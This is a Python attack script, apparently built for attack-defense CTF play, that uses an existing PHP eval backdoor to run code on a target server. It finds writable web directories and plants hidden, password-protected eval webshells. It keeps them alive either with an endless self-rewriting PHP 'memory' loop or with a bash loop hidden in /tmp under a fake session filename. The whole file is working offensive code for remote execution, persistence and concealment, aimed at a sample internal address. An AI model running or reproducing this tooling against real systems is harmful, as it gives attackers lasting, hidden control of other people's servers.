#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 通过任意命令执行达到权限维持的效果

import requests
import random
import string
import hashlib
from urllib.parse import urlparse
from module.php.config import salt_key , shell_timeout
# salt_key = "fantasy"
# wait_time = 300
# shell_timeout = 1 # core.php.shell
n_md5 = lambda text : hashlib.md5(text).hexdigest()


def get_password(host, port):
    return n_md5(salt_key + host + ":" + port)


def get_shell_content(password):
    key1 = n_md5(n_md5(salt_key))
    return '<?php if(md5(md5($_REQUEST[key1])) == "%s"){\neval($_REQUEST["%s"]);}?>' % (key1 , password)

def random_string(length):
    result = [random.choice(string.letters) for i in range(length)]
    return "".join(result)


def shell_exec(url, key, code , active = False):
    flag = random_string(0x10)
    tmp = "echo '%s';%s;echo '%s';" % (flag, code, flag)
    # data = {
    #     "mood": getcode(tmp)
    # }
    data = {
        key: "echo '%s';%s;echo '%s';" % (flag, code, flag)
    }
    try:
        response = requests.post(url , data=data,timeout=shell_timeout)
        content = response.content
        if flag in content:
            return content.split(flag)[1]
        return content
    except Exception as e:
        print(("[-] %s" % (e)))
        print(url)
        if active is True:
            return True
        return ""

def code_exec(url, key, command):
    flag = "->|"
    data = {
        # "a":"%s && echo '%s';" % (command, flag)
        key: '''echo '%s';%s;echo '%s';''' % (flag , command , flag)
    }

    try:
        response = requests.post(url, data=data, timeout=shell_timeout)
        content = response.content
        if "->|" in content:
            return content.split(flag)[1]
        return ""
    except Exception as e:
        print(("[-] %s" % (e)))
        return ""


def get_writable_dir_code(url, key, root):
    code = "function scan($path){ foreach(scandir($path) as $file){ if($file == '.' || $file == '..'){ continue; } if(is_dir($path.'/'.$file)){ if(is_writable($path.'/'.$file)){ echo $path.'/'.$file.\"\n\"; } scan($path.'/'.$file); } } } scan('" + root + "');"
    payload = "eval(base64_decode('%s'));" % (code.encode("base64").replace("\n", ""))
    content = code_exec(url, key, payload)
    if "".join(content.split()) == "":
        print("[!] No Writable Dirs")
        return ""
    return content.split("\n")


def get_writable_dir_shell(url, key, root):
    command = "find %s -type d -writable" % (root)
    print(("[+] Executing : [%s]" % (command)))
    content = shell_exec(url, key, command)
    if ''.join(content.split()) == "":
        print("[!] No Writable Dirs")
        return ""
    result = content.split("\n")
    #print(result)
    #print(result)
    return result


def write_memery_webshell(url, key, directory, password):
    sleep_time = 500  # micro second
    code = '''<?php $content = '%s'; $writable_path = "%s"; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true){ if(file_get_contents($path) != $content){ file_put_contents($path, $content); } usleep(%d); }?>''' % (
    get_shell_content(password), directory, password, sleep_time)
    filename = ".%s.php" % (password)
    path = "%s/%s" % (directory, filename)
    payload = "file_put_contents('%s', base64_decode('%s'));" % (path, code.encode("base64").replace("\n", ""))
    #print(payload)

    return code_exec(url, key, payload).split("\n")[0:-1]


def active_memery_webshell(url):
    try:
        requests.get(url, timeout=0.5)
        return False
    except:
        return True


def shell(url, key, root="/var/www/html", type="code"):
    shell_list = []
    _url = urlparse(url)
    host = _url.hostname
    port = str(_url.port)
    password = get_password(host, port)
    writable_dirs = []
    print("[+] Getting writable dirs...")
    if type == 'code':
        writable_dirs = get_writable_dir_code(url, key, root)[:-1]
    elif type == 'shell':
        writable_dirs = get_writable_dir_shell(url, key, root)[:-1]
    if len(writable_dirs) != 0:
        writable_dirs = writable_dirs[1:20]
    print(("[+] Writable dirs : " ,))
    print(writable_dirs)

    if len(writable_dirs) != 0:
        for writable_dir in writable_dirs:
            webshell_url = "http://%s:%s/%s/.%s.php" % (host, port, writable_dir.replace(root, ""), password)
            if type == "code":
                write_memery_webshell(url, key, writable_dir, password)
                print(("[+] Webshell : %s" % (webshell_url)))
                print("[+] Activing memery webshell...")
                if active_memery_webshell(webshell_url) is True:
                    shell_list.append(webshell_url)
                    print("[+] Active success")
            elif type == "shell":
                commands = []
                fake_filename = random_string(0x10)
                filename = "SESS_%s" % (fake_filename)
                path = "/tmp/%s" % (filename)
                real_command = "#!/bin/sh\n"
                real_command += "\n"
                real_command += "while :\n"
                real_command += "do\n"
                # real_command += "rm -rf %s/*\n" % (writable_dir)
                real_command += "echo '%s' | base64 -d > %s\n" % ((get_shell_content(password)).encode("base64").replace("\n", ""), "%s/.%s.php" % (writable_dir, password))
                real_command += "sleep 0.1\n"
                real_command += "done\n"
                # commands.append("rm -rf %s" % (path))
                commands.append("echo '%s' | base64 -d > %s" % (real_command.encode("base64").replace("\n", ""), path))
                commands.append("chmod o+x %s" % (path))
                commands.append("bash -x %s" % (path))
                #print(commands)
                for command in commands:
                    if shell_exec(url, key, command , active = True) is True:
                        shell_list.append(webshell_url)
                        print("[+] Active success")
    else :
        print(("[!] %s Can Find Any Writable Dirs!" % url))

    bRet = True if len(shell_list) != 0 else False
    return [bRet , password , shell_list]




if __name__ == "__main__":
    shell("http://172.16.5.10:5050", 'HDwiki', root = '/var/www/html', type="code")